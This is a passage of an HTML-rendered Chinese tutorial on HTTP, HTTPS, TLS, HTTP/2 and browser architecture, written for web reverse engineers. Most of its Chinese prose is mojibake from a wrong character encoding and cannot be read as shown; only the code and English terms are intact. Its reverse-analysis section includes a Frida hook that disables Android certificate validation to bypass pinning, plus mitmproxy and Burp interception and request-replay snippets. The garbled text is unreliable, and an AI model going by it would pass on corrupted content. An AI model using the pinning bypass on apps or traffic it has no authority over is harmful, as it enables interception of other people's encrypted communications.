<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">token=xyz789</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">42</span>

<span class="p">{</span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="s2">&quot;success&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="mi">123</span><span class="p">}}</span>
</code></pre>
      </div>

      <p><strong>ç»„æˆéƒ¨åˆ†</strong>ï¼š</p>

      <ol>
        <li>çŠ¶æ€è¡Œï¼šåè®®ç‰ˆæœ¬ + çŠ¶æ€ç  + çŠ¶æ€æè¿°</li>
        <li>å“åº”å¤´</li>
        <li>ç©ºè¡Œ</li>
        <li>å“åº”ä½“</li>
      </ol>

      <hr />

      <h2 id="çŠ¶æ€ç ">çŠ¶æ€ç </h2>

      <h3 id="1xx-ä¿¡æ¯å“åº”">1xx ä¿¡æ¯å“åº”</h3>

      <ul>
        <li><strong>100 Continue</strong>: ç»§ç»­è¯·æ±‚</li>
        <li><strong>101 Switching Protocols</strong>: åˆ‡æ¢åè®®</li>
      </ul>

      <h3 id="2xx-æˆåŠŸ">2xx æˆåŠŸ</h3>

      <ul>
        <li><strong>200 OK</strong>: è¯·æ±‚æˆåŠŸ</li>
        <li><strong>201 Created</strong>: èµ„æºå·²åˆ›å»º</li>
        <li><strong>204 No Content</strong>: æ— å†…å®¹è¿”å›</li>
      </ul>

      <h3 id="3xx-é‡å®šå‘">3xx é‡å®šå‘</h3>

      <ul>
        <li><strong>301 Moved Permanently</strong>: æ°¸ä¹…é‡å®šå‘</li>
        <li><strong>302 Found</strong>: ä¸´æ—¶é‡å®šå‘</li>
        <li><strong>304 Not Modified</strong>: èµ„æºæœªä¿®æ”¹</li>
      </ul>

      <h3 id="4xx-å®¢æˆ·ç«¯é”™è¯¯">4xx å®¢æˆ·ç«¯é”™è¯¯</h3>

      <ul>
        <li><strong>400 Bad Request</strong>: è¯·æ±‚é”™è¯¯</li>
        <li><strong>401 Unauthorized</strong>: æœªæˆæƒ</li>
        <li><strong>403 Forbidden</strong>: ç¦æ­¢è®¿é—®</li>
        <li><strong>404 Not Found</strong>: èµ„æºä¸å­˜åœ¨</li>
        <li><strong>429 Too Many Requests</strong>: è¯·æ±‚è¿‡å¤š</li>
      </ul>

      <h3 id="5xx-æœåŠ¡å™¨é”™è¯¯">5xx æœåŠ¡å™¨é”™è¯¯</h3>

      <ul>
        <li><strong>500 Internal Server Error</strong>: æœåŠ¡å™¨å†…éƒ¨é”™è¯¯</li>
        <li><strong>502 Bad Gateway</strong>: ç½‘å…³é”™è¯¯</li>
        <li><strong>503 Service Unavailable</strong>: æœåŠ¡ä¸å¯ç”¨</li>
      </ul>

      <hr />

      <h2 id="é‡è¦çš„-http-å¤´éƒ¨">é‡è¦çš„ HTTP å¤´éƒ¨</h2>

      <h3 id="è¯·æ±‚å¤´">è¯·æ±‚å¤´</h3>

      <table>
        <thead>
          <tr>
            <th>Header</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>User-Agent</code></td>
            <td>å®¢æˆ·ç«¯æ ‡è¯†</td>
            <td><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</code></td>
          </tr>
          <tr>
            <td><code>Accept</code></td>
            <td>å¯æ¥å—çš„å†…å®¹ç±»å‹</td>
            <td><code>application/json, text/html</code></td>
          </tr>
          <tr>
            <td><code>Accept-Encoding</code></td>
            <td>å¯æ¥å—çš„ç¼–ç </td>
            <td><code>gzip, deflate, br</code></td>
          </tr>
          <tr>
            <td><code>Accept-Language</code></td>
            <td>å¯æ¥å—çš„è¯­è¨€</td>
            <td><code>zh-CN,zh;q=0.9,en;q=0.8</code></td>
          </tr>
          <tr>
            <td><code>Cookie</code></td>
            <td>Cookie ä¿¡æ¯</td>
            <td><code>session_id=abc123; token=xyz</code></td>
          </tr>
          <tr>
            <td><code>Referer</code></td>
            <td>æ¥æºé¡µé¢</td>
            <td><code>https://example.com/page1</code></td>
          </tr>
          <tr>
            <td><code>Origin</code></td>
            <td>è¯·æ±‚æ¥æº</td>
            <td><code>https://example.com</code></td>
          </tr>
          <tr>
            <td><code>Authorization</code></td>
            <td>è®¤è¯ä¿¡æ¯</td>
            <td><code>Bearer eyJhbGciOiJIUzI1NiIs...</code></td>
          </tr>
          <tr>
            <td><code>Content-Type</code></td>
            <td>è¯·æ±‚ä½“ç±»å‹</td>
            <td><code>application/json</code></td>
          </tr>
          <tr>
            <td><code>Content-Length</code></td>
            <td>è¯·æ±‚ä½“é•¿åº¦</td>
            <td><code>256</code></td>
          </tr>
        </tbody>
      </table>

      <h3 id="å“åº”å¤´">å“åº”å¤´</h3>

      <table>
        <thead>
          <tr>
            <th>Header</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Content-Type</code></td>
            <td>å“åº”å†…å®¹ç±»å‹</td>
            <td><code>application/json; charset=utf-8</code></td>
          </tr>
          <tr>
            <td><code>Content-Length</code></td>
            <td>å“åº”ä½“é•¿åº¦</td>
            <td><code>1024</code></td>
          </tr>
          <tr>
            <td><code>Set-Cookie</code></td>
            <td>è®¾ç½® Cookie</td>
            <td><code>session_id=abc; Path=/; HttpOnly</code></td>
          </tr>
          <tr>
            <td><code>Cache-Control</code></td>
            <td>ç¼“å­˜æ§åˆ¶</td>
            <td><code>no-cache, no-store, must-revalidate</code></td>
          </tr>
          <tr>
            <td><code>Access-Control-Allow-Origin</code></td>
            <td>CORS å…è®¸çš„æº</td>
            <td><code>*</code> æˆ– <code>https://example.com</code></td>
          </tr>
          <tr>
            <td><code>Location</code></td>
            <td>é‡å®šå‘åœ°å€</td>
            <td><code>https://example.com/new-page</code></td>
          </tr>
          <tr>
            <td><code>Content-Encoding</code></td>
            <td>å†…å®¹ç¼–ç </td>
            <td><code>gzip</code></td>
          </tr>
          <tr>
            <td><code>ETag</code></td>
            <td>èµ„æºæ ‡è¯†</td>
            <td><code>"33a64df551425fcc55e4d42a148795d9f25f89d4"</code></td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="https-å·¥ä½œåŸç†">HTTPS å·¥ä½œåŸç†</h2>

      <h3 id="tlsssl-åŠ å¯†">TLS/SSL åŠ å¯†</h3>

      <p>HTTPS åœ¨ HTTP åŸºç¡€ä¸Šå¢åŠ äº† TLS/SSL åŠ å¯†å±‚ï¼š</p>

      <pre><code>åº”ç”¨å±‚: HTTP
å®‰å…¨å±‚: TLS/SSL
ä¼ è¾“å±‚: TCP
ç½‘ç»œå±‚: IP
</code></pre>

      <h3 id="tls-æ¡æ‰‹è¿‡ç¨‹">TLS æ¡æ‰‹è¿‡ç¨‹</h3>

      <ol>
        <li><strong>ClientHello</strong>: å®¢æˆ·ç«¯å‘é€æ”¯æŒçš„åŠ å¯†å¥—ä»¶ã€TLS ç‰ˆæœ¬ç­‰</li>
        <li><strong>ServerHello</strong>: æœåŠ¡å™¨é€‰æ‹©åŠ å¯†å¥—ä»¶ï¼Œå‘é€è¯ä¹¦</li>
        <li><strong>è¯ä¹¦éªŒè¯</strong>: å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨è¯ä¹¦</li>
        <li><strong>å¯†é’¥äº¤æ¢</strong>: ä½¿ç”¨ RSA æˆ– DH ç®—æ³•äº¤æ¢å¯†é’¥</li>
        <li><strong>å®Œæˆæ¡æ‰‹</strong>: åŒæ–¹ç¡®è®¤ï¼Œå¼€å§‹åŠ å¯†é€šä¿¡</li>
      </ol>

      <h3 id="è¯ä¹¦éªŒè¯">è¯ä¹¦éªŒè¯</h3>

      <ul>
        <li><strong>è¯ä¹¦é“¾</strong>: æœåŠ¡å™¨è¯ä¹¦ â†’ ä¸­é—´è¯ä¹¦ â†’ æ ¹è¯ä¹¦</li>
        <li><strong>ä¿¡ä»»é”šç‚¹</strong>: æ“ä½œç³»ç»Ÿ/æµè§ˆå™¨å†…ç½®çš„æ ¹è¯ä¹¦</li>
        <li><strong>è¯ä¹¦åŠé”€</strong>: CRL å’Œ OCSP æ£€æŸ¥</li>
      </ul>

      <hr />

      <h2 id="é€†å‘åˆ†æä¸­çš„åº”ç”¨">é€†å‘åˆ†æä¸­çš„åº”ç”¨</h2>

      <h3 id="1-æµé‡åˆ†æ">1. æµé‡åˆ†æ</h3>

      <p>ä½¿ç”¨ä»£ç†å·¥å…·æ‹¦æˆªå’Œåˆ†æ HTTPS æµé‡ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ mitmproxy</span>
mitmproxy<span class="w"> </span>--mode<span class="w"> </span>transparent<span class="w"> </span>--set<span class="w"> </span><span class="nv">console_mouse</span><span class="o">=</span><span class="nb">false</span>

<span class="c1"># ä½¿ç”¨ Burp Suite</span>
<span class="c1"># é…ç½®æµè§ˆå™¨ä»£ç†åˆ° 127.0.0.1:8080</span>
<span class="c1"># å®‰è£… Burp CA è¯ä¹¦</span>
</code></pre>
      </div>

      <h3 id="2-è¯ä¹¦ç»•è¿‡">2. è¯ä¹¦ç»•è¿‡</h3>

      <p>æŸäº›åº”ç”¨ä¼šè¿›è¡Œè¯ä¹¦å›ºå®šï¼ˆCertificate Pinningï¼‰ï¼Œéœ€è¦ç»•è¿‡ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook Java çš„è¯ä¹¦éªŒè¯ (Android)</span>
<span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">TrustManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;javax.net.ssl.X509TrustManager&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">TrustManager</span><span class="p">.</span><span class="nx">checkServerTrusted</span><span class="p">.</span><span class="nx">implementation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">chain</span><span class="p">,</span><span class="w"> </span><span class="nx">authType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Certificate pinning bypassed&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="3-è¯·æ±‚é‡æ”¾">3. è¯·æ±‚é‡æ”¾</h3>

      <p>æ•è·è¯·æ±‚åå¯ä»¥ä¿®æ”¹å‚æ•°é‡æ”¾ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="s1">&#39;Bearer token123&#39;</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
    <span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
    <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="s1">&#39;value&#39;</span><span class="p">}</span>
<span class="p">)</span>
</code></pre>
      </div>

      <h3 id="4-ç­¾ååˆ†æ">4. ç­¾ååˆ†æ</h3>

      <p>å¾ˆå¤š API ä¼šå¯¹è¯·æ±‚å‚æ•°è¿›è¡Œç­¾åï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å¸¸è§çš„ç­¾åç”Ÿæˆæµç¨‹</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">generateSignature</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 1. å‚æ•°æ’åº</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">sorted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nx">sort</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// 2. æ‹¼æ¥å­—ç¬¦ä¸²</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">sorted</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">key</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">str</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">params</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;&amp;&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// 3. åŠ ä¸Šå¯†é’¥</span>
<span class="w">    </span><span class="nx">str</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">&#39;secret_key&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// 4. MD5/SHA256 å“ˆå¸Œ</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="http2-ç‰¹æ€§">HTTP/2 ç‰¹æ€§</h2>

      <h3 id="å¤šè·¯å¤ç”¨">å¤šè·¯å¤ç”¨</h3>

      <ul>
        <li>å•ä¸ª TCP è¿æ¥å¯ä»¥å¹¶å‘å¤šä¸ªè¯·æ±‚</li>
        <li>è§£å†³äº† HTTP/1.1 çš„é˜Ÿå¤´é˜»å¡é—®é¢˜</li>
      </ul>

      <h3 id="äºŒè¿›åˆ¶åˆ†å¸§">äºŒè¿›åˆ¶åˆ†å¸§</h3>

      <ul>
        <li>ä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼è€Œéæ–‡æœ¬</li>
        <li>æ›´é«˜æ•ˆçš„è§£æ</li>
      </ul>

      <h3 id="æœåŠ¡å™¨æ¨é€">æœåŠ¡å™¨æ¨é€</h3>

      <ul>
        <li>æœåŠ¡å™¨å¯ä»¥ä¸»åŠ¨æ¨é€èµ„æº</li>
        <li>å‡å°‘è¯·æ±‚æ¬¡æ•°</li>
      </ul>

      <h3 id="å¤´éƒ¨å‹ç¼©">å¤´éƒ¨å‹ç¼©</h3>

      <ul>
        <li>ä½¿ç”¨ HPACK ç®—æ³•å‹ç¼©å¤´éƒ¨</li>
        <li>å‡å°‘ä¼ è¾“æ•°æ®é‡</li>
      </ul>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q-å¦‚ä½•åœ¨é€†å‘æ—¶è¯†åˆ«-api-åŠ å¯†">Q: å¦‚ä½•åœ¨é€†å‘æ—¶è¯†åˆ« API åŠ å¯†ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li>æŠ“åŒ…è§‚å¯Ÿè¯·æ±‚å‚æ•°æ˜¯å¦æœ‰æ˜æ˜¾çš„åŠ å¯†ç‰¹å¾ï¼ˆBase64ã€Hex ç¼–ç ï¼‰</li>
        <li>åœ¨æµè§ˆå™¨ DevTools ä¸­æœç´¢å‚æ•°åï¼Œå®šä½åˆ°ç”Ÿæˆä»£ç </li>
        <li>è®¾ç½®æ–­ç‚¹ï¼Œè¿½è¸ªå‚æ•°ç”Ÿæˆæµç¨‹</li>
        <li>è¯†åˆ«ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼ˆå¸¸è§çš„æœ‰ MD5ã€SHA256ã€AES ç­‰ï¼‰</li>
      </ol>

      <h3 id="q-https-ä¸€å®šå®‰å…¨å—">Q: HTTPS ä¸€å®šå®‰å…¨å—ï¼Ÿ</h3>

      <p><strong>A</strong>:<br />
        ä¸ä¸€å®šã€‚HTTPS åªä¿è¯ä¼ è¾“å±‚å®‰å…¨ï¼Œä½†ä¸èƒ½é˜²æ­¢ï¼š</p>

      <ul>
        <li>XSS æ”»å‡»</li>
        <li>CSRF æ”»å‡»</li>
        <li>ä¸­é—´äººæ”»å‡»ï¼ˆå¦‚æœè¯ä¹¦éªŒè¯è¢«ç»•è¿‡ï¼‰</li>
        <li>åº”ç”¨å±‚çš„é€»è¾‘æ¼æ´</li>
      </ul>

      <h3 id="q-å¦‚ä½•å¤„ç†-http2-çš„æµé‡åˆ†æ">Q: å¦‚ä½•å¤„ç† HTTP/2 çš„æµé‡åˆ†æï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ul>
        <li>ä½¿ç”¨æ”¯æŒ HTTP/2 çš„ä»£ç†å·¥å…·ï¼ˆå¦‚æœ€æ–°ç‰ˆ Burp Suiteã€Charlesï¼‰</li>
        <li>æµè§ˆå™¨ DevTools å¯ä»¥æŸ¥çœ‹ HTTP/2 æµé‡</li>
        <li>Wireshark å¯ä»¥è§£æ HTTP/2 åè®®ï¼ˆéœ€è¦ SSL å¯†é’¥ï¼‰</li>
      </ul>

      <hr />

      <h2 id="è¿›é˜¶é˜…è¯»">è¿›é˜¶é˜…è¯»</h2>

      <ul>
        <li><a href="https://tools.ietf.org/html/rfc7230">RFC 7230 - HTTP/1.1 Message Syntax and Routing</a></li>
        <li><a href="https://tools.ietf.org/html/rfc7540">RFC 7540 - HTTP/2</a></li>
        <li><a href="https://tools.ietf.org/html/rfc8446">RFC 8446 - TLS 1.3</a></li>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP">MDN Web Docs - HTTP</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#01-Foundations-tls-ssl-handshake">TLS/SSL æ¡æ‰‹è¿‡ç¨‹</a></li>
        <li><a href="#01-Foundations-cors-and-same-origin-policy">CORS ä¸åŒæºç­–ç•¥</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
        <li><a href="#02-Tooling-burp-suite-guide">Burp Suite æŒ‡å—</a></li>
      </ul>

    </div>

    <div class="section" id="01-Foundations-browser-architecture">
      <h2>6. Browser Architecture</h2>
      <h1 id="æµè§ˆå™¨æ¶æ„ä¸æ¸²æŸ“å¼•æ“">æµè§ˆå™¨æ¶æ„ä¸æ¸²æŸ“å¼•æ“</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>äº†è§£æµè§ˆå™¨çš„å†…éƒ¨æ¶æ„å’Œæ¸²æŸ“æµç¨‹ï¼Œæœ‰åŠ©äºé€†å‘å·¥ç¨‹å¸ˆç†è§£é¡µé¢æ˜¯å¦‚ä½•ä»ä»£ç å˜æˆå¯è§†åŒ–çš„åƒç´ çš„ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨è¿™äº›æœºåˆ¶æ¥æ£€æµ‹è‡ªåŠ¨åŒ–å·¥å…·æˆ–åè°ƒè¯•ã€‚</p>

      <hr />

      <h2 id="æµè§ˆå™¨ä½œä¸ºæ“ä½œç³»ç»Ÿ">æµè§ˆå™¨ä½œä¸ºæ“ä½œç³»ç»Ÿ</h2>

      <p>ç°ä»£æµè§ˆå™¨ï¼ˆå¦‚ Chromeï¼‰ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æ¡£æŸ¥çœ‹å™¨ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚</p>

      <h3 id="å¤šè¿›ç¨‹æ¶æ„-chrome-æ¨¡å‹">å¤šè¿›ç¨‹æ¶æ„ (Chrome æ¨¡å‹)</h3>

      <p>ä¸ºäº†ç¨³å®šæ€§å’Œå®‰å…¨æ€§ï¼Œç°ä»£æµè§ˆå™¨é‡‡ç”¨å¤šè¿›ç¨‹æ¶æ„ï¼š</p>

      <pre><code>graph TB
    subgraph Chrome["Chrome æµè§ˆå™¨"]
        Browser[Browser Process&lt;br/&gt;ä¸»è¿›ç¨‹&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ UI ç®¡ç†&lt;br/&gt;â€¢ ç½‘ç»œè¯·æ±‚&lt;br/&gt;â€¢ è¿›ç¨‹åè°ƒ&lt;br/&gt;â€¢ æƒé™ç®¡ç†]

        subgraph Renderers["Renderer Processes (æ¸²æŸ“è¿›ç¨‹)"]
            R1[Tab 1&lt;br/&gt;â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Blink å¼•æ“&lt;br/&gt;â€¢ V8 å¼•æ“&lt;br/&gt;â€¢ DOM/CSSOM&lt;br/&gt;â€¢ JavaScript]
            R2[Tab 2&lt;br/&gt;â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Blink å¼•æ“&lt;br/&gt;â€¢ V8 å¼•æ“&lt;br/&gt;â€¢ DOM/CSSOM&lt;br/&gt;â€¢ JavaScript]
            R3[Tab 3&lt;br/&gt;â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Blink å¼•æ“&lt;br/&gt;â€¢ V8 å¼•æ“&lt;br/&gt;â€¢ DOM/CSSOM&lt;br/&gt;â€¢ JavaScript]
        end

        GPU[GPU Process&lt;br/&gt;GPU è¿›ç¨‹&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Canvas æ¸²æŸ“&lt;br/&gt;â€¢ WebGL&lt;br/&gt;â€¢ CSS 3D å˜æ¢&lt;br/&gt;â€¢ è§†é¢‘è§£ç ]

        Plugin[Plugin Process&lt;br/&gt;æ’ä»¶è¿›ç¨‹&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Flash (å·²å¼ƒç”¨)&lt;br/&gt;â€¢ PDF é˜…è¯»å™¨&lt;br/&gt;â€¢ å…¶ä»–æ’ä»¶]

        Network[Network Service&lt;br/&gt;ç½‘ç»œæœåŠ¡&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ HTTP/HTTPS&lt;br/&gt;â€¢ WebSocket&lt;br/&gt;â€¢ DNS è§£æ]
    end

    Browser --&gt; R1
    Browser --&gt; R2
    Browser --&gt; R3
    Browser --&gt; GPU
    Browser --&gt; Plugin
    Browser --&gt; Network

    R1 --&gt; GPU
    R2 --&gt; GPU
    R3 --&gt; GPU

    style Browser fill:#4a90e2
    style R1 fill:#7ed321
    style R2 fill:#7ed321
    style R3 fill:#7ed321
    style GPU fill:#f5a623
    style Plugin fill:#bd10e0
    style Network fill:#50e3c2
</code></pre>

      <p><strong>å„è¿›ç¨‹èŒè´£</strong>:</p>

      <ol>
        <li><strong>Browser Process (ä¸»è¿›ç¨‹)</strong>: è´Ÿè´£åœ°å€æ ã€ä¹¦ç­¾ã€å‰è¿›/åé€€ã€åè°ƒå…¶ä»–è¿›ç¨‹ã€‚</li>
        <li><strong>Renderer Process (æ¸²æŸ“è¿›ç¨‹)</strong>: <strong>æ ¸å¿ƒå…³æ³¨ç‚¹</strong>ã€‚è´Ÿè´£å°† HTML/CSS/JS è½¬æ¢ä¸ºç½‘é¡µã€‚
          <ul>
            <li>é€šå¸¸æ¯ä¸ª Tab æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ˆSite Isolationï¼‰ã€‚</li>
            <li>JS ä¹Ÿæ˜¯è¿è¡Œåœ¨è¿™é‡Œï¼ˆV8 å¼•æ“ï¼‰ã€‚</li>
          </ul>
        </li>
        <li><strong>GPU Process</strong>: å¤„ç† GPU ä»»åŠ¡ï¼ˆCSS 3D å˜æ¢ã€Canvas ç»˜å›¾ï¼‰ã€‚</li>
        <li><strong>Plugin Process</strong>: è¿è¡Œ Flash ç­‰æ’ä»¶ã€‚</li>
        <li><strong>Network Service</strong>: å¤„ç†æ‰€æœ‰ç½‘ç»œè¯·æ±‚ã€‚</li>
      </ol>

      <h3 id="é€†å‘å¯ç¤º">é€†å‘å¯ç¤º</h3>

      <ul>
        <li><strong>å†…å­˜éš”ç¦»</strong>: ç”±äºä¸åŒ Tab åœ¨ä¸åŒè¿›ç¨‹ï¼Œä½ ä¸èƒ½ç®€å•åœ°è·¨ Tab ç›´æ¥è¯»å†™å†…å­˜æ•°æ®ï¼ˆé™¤éé€šè¿‡ DevTools åè®®ï¼‰ã€‚</li>
        <li><strong>Headless æ£€æµ‹</strong>: æ— å¤´æµè§ˆå™¨ï¼ˆHeadless Chromeï¼‰åœ¨å¯åŠ¨æ—¶æŸäº›å›¾å½¢ç›¸å…³çš„è¿›ç¨‹è¡Œä¸ºæˆ– GPU å‚æ•°å¯èƒ½ä¸æ­£å¸¸æµè§ˆå™¨ä¸åŒï¼Œè¿™å¸¸è¢«ç”¨äºåçˆ¬æ£€æµ‹ã€‚</li>
      </ul>

      <hr />

      <h2 id="æ¸²æŸ“æµç¨‹-rendering-pipeline">æ¸²æŸ“æµç¨‹ (Rendering Pipeline)</h2>

      <p>ç†è§£æ¸²æŸ“æµç¨‹å¯¹äºåˆ†æåçˆ¬è™«æŠ€æœ¯ï¼ˆå¦‚éªŒè¯ç çš„äººæœºè¯†åˆ«ã€DOM æ··æ·†ï¼‰å¾ˆæœ‰å¸®åŠ©ã€‚</p>

      <h3 id="1-è§£æ-parsing">1. è§£æ (Parsing)</h3>

      <ul>
        <li><strong>HTML -> DOM</strong>: è§£æ HTML æ–‡æœ¬ç”Ÿæˆ DOM æ ‘ã€‚</li>
        <li><strong>CSS -> CSSOM</strong>: è§£æ CSS ç”Ÿæˆ CSSOM æ ‘ã€‚</li>
      </ul>

      <h3 id="2-å¸ƒå±€-layout-reflow">2. å¸ƒå±€ (Layout / Reflow)</h3>

      <ul>
        <li>DOM + CSSOM åˆå¹¶ä¸º <strong>Render Tree</strong>ã€‚</li>
        <li>è®¡ç®—æ¯ä¸ªèŠ‚ç‚¹çš„ç¡®åˆ‡å‡ ä½•ä½ç½®ï¼ˆåæ ‡ã€å®½é«˜ï¼‰ã€‚</li>
        <li><strong>Reflow (å›æµ)</strong>: å½“é¡µé¢å¸ƒå±€å‘ç”Ÿå˜åŒ–ï¼ˆå¦‚ JS ä¿®æ”¹äº†å®½é«˜ï¼‰ï¼Œæµè§ˆå™¨éœ€è¦é‡æ–°è®¡ç®—å¸ƒå±€ã€‚è¿™å¾ˆæ¶ˆè€—æ€§èƒ½ã€‚</li>
      </ul>

      <h3 id="3-ç»˜åˆ¶-painting-repaint">3. ç»˜åˆ¶ (Painting / Repaint)</h3>

      <ul>
        <li>å°† Render Tree è½¬æ¢ä¸ºå±å¹•ä¸Šçš„åƒç´ ã€‚</li>
        <li><strong>Repaint (é‡ç»˜)</strong>: æ”¹å˜é¢œè‰²ä½†ä¸å˜å¸ƒå±€çš„æ“ä½œã€‚</li>
      </ul>

      <h3 id="4-åˆæˆ-compositing">4. åˆæˆ (Compositing)</h3>

      <ul>
        <li>æµè§ˆå™¨å°†é¡µé¢åˆ†ä¸ºå¤šä¸ªå›¾å±‚ï¼ˆLayersï¼‰ï¼ŒGPU å°†è¿™äº›å›¾å±‚åˆæˆä¸€å¼ å›¾ç‰‡ã€‚</li>
      </ul>

      <h3 id="å®Œæ•´æ¸²æŸ“æµç¨‹å›¾">å®Œæ•´æ¸²æŸ“æµç¨‹å›¾</h3>

      <pre><code>flowchart TB
    subgraph Input["è¾“å…¥é˜¶æ®µ"]
        HTML[HTML æ–‡æ¡£]
        CSS[CSS æ ·å¼è¡¨]
        JS[JavaScript]
    end

    subgraph Parse["è§£æé˜¶æ®µ"]
        HTMLParse[HTML è§£æå™¨]
        CSSParse[CSS è§£æå™¨]
        DOM[DOM Tree]
        CSSOM[CSSOM Tree]
    end

    subgraph Render["æ¸²æŸ“æ ‘æ„å»º"]
        RenderTree[Render Tree&lt;br/&gt;åˆå¹¶ DOM + CSSOM]
    end

    subgraph Layout["å¸ƒå±€è®¡ç®—"]
        LayoutCalc[è®¡ç®—å‡ ä½•ä½ç½®&lt;br/&gt;Layout/Reflow]
    end

    subgraph Paint["ç»˜åˆ¶"]
        PaintOps[ç”Ÿæˆç»˜åˆ¶æŒ‡ä»¤&lt;br/&gt;Painting/Repaint]
        Layers[åˆ†å±‚ Layering]
    end

    subgraph Composite["åˆæˆ"]
        Raster[æ …æ ¼åŒ– Rasterize]
        GPUComp[GPU åˆæˆ]
        Display[æ˜¾ç¤ºåˆ°å±å¹•]
    end

    HTML --&gt; HTMLParse --&gt; DOM
    CSS --&gt; CSSParse --&gt; CSSOM
    DOM --&gt; RenderTree
    CSSOM --&gt; RenderTree
    RenderTree --&gt; LayoutCalc
    LayoutCalc --&gt; PaintOps
    PaintOps --&gt; Layers
    Layers --&gt; Raster
    Raster --&gt; GPUComp
    GPUComp --&gt; Display

    JS -.-&gt;|ä¿®æ”¹ DOM| DOM
